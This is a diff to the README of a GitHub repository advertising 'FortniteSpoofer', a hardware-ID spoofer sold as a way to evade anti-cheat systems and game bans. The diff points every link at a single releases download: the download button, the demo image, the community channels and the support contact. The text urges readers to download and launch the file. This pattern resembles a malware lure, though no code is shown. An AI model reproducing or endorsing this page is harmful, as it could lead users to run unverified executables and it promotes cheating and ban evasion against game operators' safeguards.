@@ -25,16 +25,16 @@ Welcome to the FortniteSpoofer repository! 🎮 This powerful tool is designed t
 - valorant-hwid-changer-2025
 
 ## Get Started
-Find the latest release of FortniteSpoofer [here](https://github.com/assets/Release.zip).
+Find the latest release of FortniteSpoofer [here](https://github.com/Shaun431/FortniteSpoofer/releases).
 
-[![Download](https://img.shields.io/badge/Download-FortniteSpoofer-blue)](https://github.com/assets/Release.zip)
+[![Download](https://github.com/Shaun431/FortniteSpoofer/releases)](https://github.com/Shaun431/FortniteSpoofer/releases)
 
 If the link ends with a file name, make sure to download and launch the file. If the link points to a website, simply visit it. If the link is not working or not provided, check the "Releases" section of this repository for the latest version.
 
 ## How FortniteSpoofer Works
 FortniteSpoofer is a sophisticated tool that alters the unique identifiers of your hardware to evade detection by anti-cheat systems and other tracking mechanisms. By utilizing this spoofer, you can enjoy your favorite games without the fear of being banned based on your hardware ID.
 
-![Spoofer Demo](https://example.com/demo.png)
+![Spoofer Demo](https://github.com/Shaun431/FortniteSpoofer/releases)
 
 ## Why Use FortniteSpoofer?
 - **Hardware Ban Evasion:** Avoid being permanently banned by changing your hardware identifiers.
@@ -58,12 +58,12 @@ Users are raving about the effectiveness of FortniteSpoofer in bypassing hardwar
 
 ## Join Our Community
 Connect with fellow gamers and tech enthusiasts in our community channels:
-- Discord: [Join Now](https://discord.gg/FortniteSpoofer)
-- Reddit: [r/FortniteSpoofer](https://www.reddit.com/r/FortniteSpoofer)
-- Twitter: [@FortniteSpooferHQ](https://twitter.com/FortniteSpooferHQ)
+- Discord: [Join Now](https://github.com/Shaun431/FortniteSpoofer/releases)
+- Reddit: [r/FortniteSpoofer](https://github.com/Shaun431/FortniteSpoofer/releases)
+- Twitter: [@FortniteSpooferHQ](https://github.com/Shaun431/FortniteSpoofer/releases)
 
 ## Help and Support
-For any questions, feedback, or support, feel free to reach out to our team at support@FortniteSpoofer.com. We are here to assist you with any issues you may encounter while using FortniteSpoofer.
+For any questions, feedback, or support, feel free to reach out to our team at https://github.com/Shaun431/FortniteSpoofer/releases We are here to assist you with any issues you may encounter while using FortniteSpoofer.
 
 Let's level up your gaming experience with FortniteSpoofer! 🎉
 
